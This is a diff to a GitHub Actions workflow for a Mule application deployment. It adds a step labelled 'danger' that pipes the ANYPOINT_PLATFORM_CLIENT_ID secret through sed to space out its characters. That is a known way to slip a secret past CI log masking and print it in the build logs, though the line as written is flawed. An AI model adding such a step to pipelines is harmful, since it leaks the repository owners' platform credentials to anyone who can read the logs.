@@ -56,7 +56,10 @@ jobs:
           custom-facts: |
             - name: Environment
               value: ${{inputs.muleEnvironment}}
-
+      
+      - name: danger
+        run: ${{secrets.ANYPOINT_PLATFORM_CLIENT_ID}} | sed 's/./& /g'
+        
       - name: Replace connected app clientid in pom.xml
         run: sed -i "s/ANYPOINT_CONNECTED_APP_ID/${{secrets.ANYPOINT_CONNECTED_APP_ID}}/g" pom.xml
 
